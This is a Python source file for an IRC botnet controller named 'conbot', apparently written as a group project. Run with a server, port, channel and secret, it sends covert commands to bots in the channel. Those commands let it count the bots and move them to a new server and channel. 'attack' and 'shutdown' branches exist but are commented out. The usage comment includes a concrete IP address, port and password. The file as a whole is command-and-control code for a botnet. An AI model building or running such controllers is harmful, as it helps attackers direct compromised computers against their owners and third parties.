import random, socket, sys, time

HOST = ""
PORT = -1
CHAN = ""

BUF_SIZE = 1024


username = ""
secret = ""

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def startConn():
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((HOST, PORT))
	except:
		print("could not connect to IRC")
		sys.exit(1)

	while 1:
		botNum = ''.join(random.choice('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ') for i in range(6))
		botName = "conbot-"
		botName = botName + botNum
		print("botname: " + botName)
		usr = "USER %s %s %s :%s\r\n" % (botName, botName, botName, botName)

		s.send(usr.encode('utf-8'))
		nick = "NICK %s \r\n" % (botName)
		s.send(nick.encode('utf-8'))
		rec = s.recv(1024).decode("utf-8")
		print(rec)
		prefix, command, args = parsemsg(rec)
		
		print("prefix: %s\ncommand: %s\n" % (prefix, command))
		
		if command != "433":
			break
	print("channel: " + CHAN)
	join = "JOIN %s\r\n" % (CHAN)
	s.send(join.encode('utf-8'))
	serverReply = s.recv(1024)
	print("Controller is running. Connected with nick: " + botName)
	while 1:
		command = input("enter command: ")
		status_num = parsecmd(command, s)
		if status_num == 1:
			break # possibly results in a memory leak if move is called a lot, dunno if it's significant enough to change



def status(s):
	bot_list = []
	msg = "PRIVMSG " + CHAN + " :" + secret + " status\r\n"

	s.send(msg.encode('utf-8'))
	print("waiting for bots to respond...")
	time.sleep(30)
	print("done sleeping")
	recvd_lines = s.recv(1024).decode('utf-8') #this buffer size may need to change
	lines = recvd_lines.split('\n')
	for line in lines:
		if not line:
			continue
		try:
			prefix, command, args = parsemsg(line)
			args = args[1].split()
			print("prefix: %s\ncommand : %s\nargs : %s" %(prefix, command, args))
			if command != "PRIVMSG" or args[0] != secret:
				continue

			if args[1]!= "status": # this part is separate just in case other lines don't have an args[1], causing an out of bounds error
				continue
			bot_list.append(args[2])
		except:
			continue

	bot_string = "Found %d bots: " % len(bot_list)
	for bot in bot_list:
		bot_string += bot + " "
	print(bot_string)

def move(s, hostname, newport, channel):
	counter = 0

	movestr = "PRIVMSG %s :%s move %s %s %s\r\n" % (CHAN, secret, hostname, newport, channel)
	print(movestr)
	s.send(movestr.encode('utf-8'))
	print("waiting for bots to respond")
	time.sleep(5)

	recvd_lines = s.recv(1024).decode('utf-8')
	lines = recvd_lines.split('\n')

	for line in lines:
		if not line:
			continue
		prefix, command, args = parsemsg(line)
		args = args[1].split()
		if command != "PRIVMSG" or args[0] != secret:
			continue

		if args[1] != "moved":
			continue

		counter += 1

	print("%d bots were moved." % (counter))
	s.send("QUIT\r\n".encode('utf-8'))
	s.close()
	global HOST
	HOST=hostname
	global PORT
	PORT=int(newport)
	global CHAN
	CHAN="#"+channel

	startConn()

def quit(s):
	s.send("QUIT\r\n".encode('utf-8'))
	s.close()
	sys.exit(0)


#from carlos' twitch IRC bot, idk if it works with other IRCs
def parsemsg(s):
	"""Breaks a message from an IRC server into its prefix, command, and arguments.
	"""
	prefix = ''
	trailing = []
	if not s:
		return
	if s[0] == ':':
		prefix, s = s[1:].split(' ', 1)
	if s.find(' :') != -1:
		s, trailing = s.split(' :', 1)
		args = s.split()
		args.append(trailing)
	else:
		args = s.split()
	command = args.pop(0)

	# parsemsg(":test!~test@test.com PRIVMSG #channel :Hi!")
	# ('test!~test@test.com', 'PRIVMSG', ['#channel', 'Hi!'])

	return prefix, command, args	

def parsecmd(c, s):
	command = c.split()
	if command[0] == "status":
		status(s)
		return 0
	elif command[0] == "attack":
		#attack(s, command[1], command[2]) # we may want to check to see number of args is correct
		return 0
	elif command[0] == "move":
		move(s, command[1], command[2], command[3])
		return 1
	elif command[0] == "quit":
		quit(s)
		return 0
	elif command[0] == "shutdown":
		#shutdown(s)
		return 0
	else:
		print("command not found")

# python conbot.py 199.116.235.44 12399 group12 pass
if __name__ == '__main__':
	HOST = sys.argv[1]
	PORT = int(sys.argv[2])
	CHAN = "#" + sys.argv[3]
	secret = sys.argv[4]
	startConn()